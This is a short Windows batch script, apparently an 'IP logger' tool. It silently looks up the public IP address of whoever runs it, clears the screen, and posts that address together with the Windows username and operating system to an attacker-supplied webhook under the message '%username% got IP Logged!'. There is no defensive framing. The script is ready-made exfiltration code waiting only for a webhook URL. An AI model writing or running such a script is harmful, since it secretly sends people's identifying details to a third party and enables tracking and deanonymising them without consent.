@echo off
:: WEBHOOK
set webhook=[WEBHOOK HERE WITHOUT BRACKETS]

:: GETTING THE IP
curl -4 icanhazip.com 1> tmpwanip & cls & set /p ipv4= < tmpwanip & set /p ipv4= < tmpwanip & del /f tmpwanip

:: CUSTOM MESSAGE
set message=:warning: **%username% got IP Logged!** :warning:\n\n:man_pouting: **Username** : %username%\n:detective: **IP** : %ipv4%\n:window: **OS** : %os% 

:: SENDING THE MESSAGE
curl --silent --output /dev/null -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
